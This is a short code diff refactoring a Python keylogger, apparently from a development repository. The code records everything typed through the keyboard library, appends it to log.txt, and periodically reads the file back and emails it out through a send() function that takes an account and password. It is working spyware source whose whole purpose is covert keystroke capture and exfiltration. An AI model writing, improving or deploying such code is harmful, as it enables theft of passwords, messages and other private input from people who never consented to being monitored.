@@ -9,12 +9,11 @@ import time
 def get_log():
     """log/send/repeat"""
     now = time.time()
-    file = open('log.txt', 'r+')
-    while True: 
-        log = keyboard.get_typed_strings(keyboard.record(until='enter'))
-        file.write(next(log) + '\n')
-        if len(sys.argv) > 1:
-            if now >= (time.time() - 900): #send every 15 mins
+    with open('log.txt', 'r+') as file:
+        while True: 
+            log = keyboard.get_typed_strings(keyboard.record(until='enter'))
+            file.write(next(log) + '\n')
+            if len(sys.argv) > 1 and now >= (time.time() - 900): #send every 15 mins
                 try:
                     file.seek(0) #back to start of file 
                     logged = file.read() #read in whole file
@@ -24,7 +23,6 @@ def get_log():
                     now = time.time() #reset the time variable
                 except: #if file was unable to be sent continue logging 
                     continue
-    file.close()
 
 def send(logged,account,password):
     """"Send the key logs to email"""
